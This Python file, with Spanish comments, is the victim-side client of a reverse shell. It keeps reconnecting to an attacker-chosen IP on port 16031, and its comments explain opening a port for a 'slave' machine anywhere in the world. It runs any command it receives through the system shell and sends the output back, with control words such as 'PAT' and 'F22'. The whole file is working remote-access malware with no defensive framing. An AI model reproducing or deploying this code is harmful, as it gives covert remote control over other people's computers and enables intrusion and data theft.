

import os
import socket

import time
import subprocess
ip_server = "" #Aqui Pones tu ip si el exclavo esta en otra parte del mundo tienes que abrir una puerto y poner tu ip publica e

host = ip_server 
port = 16031 # si es publica aqui el puerto que abriste
started = False
so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
while True:
    time.sleep(5)
    while started == False:


        try:
            
            so.connect((host,port))
            started = True
        except:
            started = False
            time.sleep(30)


    time.sleep(1)
    data = so.recv(20480)
    data2 = str(data.decode())
    if data2 == ("PAT"):
        process = subprocess.Popen("cd", stdout=subprocess.PIPE, stderr=None, shell=True)
        output1 = process.communicate()
        
        z1 = len(output1[0]) 
        nombre = str(output1[0])
        nombre = nombre[2:z1+1]
        valor = nombre

        so.send(str.encode(valor))
        while (True):
            
            comando = so.recv(20480)
            comando = comando.decode()
            if (comando[:2] == 'cd'):
                print(comando)
                try:
                    os.chdir(comando[3:])
                except:
                    
                    process = subprocess.Popen("cd", stdout=subprocess.PIPE, stderr=None, shell=True)
                    so.send(str.encode(process.communicate()))
                process = subprocess.Popen("cd", stdout=subprocess.PIPE, stderr=None, shell=True)
                output1 = process.communicate()
                
                z1 = len(output1[0]) 
                nombre = str(output1[0])
                nombre = nombre[2:z1+1]
                valor = nombre
                so.send(str.encode(valor))
            elif (comando == 'F22' or comando == "b'F22'"):
                so.close()
                
                break
            elif (comando == 'Broke' or comando == "b'Broke'"):
                so.close()
                break
            else:

                op = subprocess.Popen(comando,shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
                output = op.stdout.read()
                output_erro = op.stderr.read()
                Fini_output = str(output + output_erro)
                so.send(str.encode(Fini_output))

        started = False
        so.close()
        if comando == 'F22' or comando == "b'F22'":
                started = True
                break

        
        host = ip_server
        port = 16031
        started = False
        so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    
            

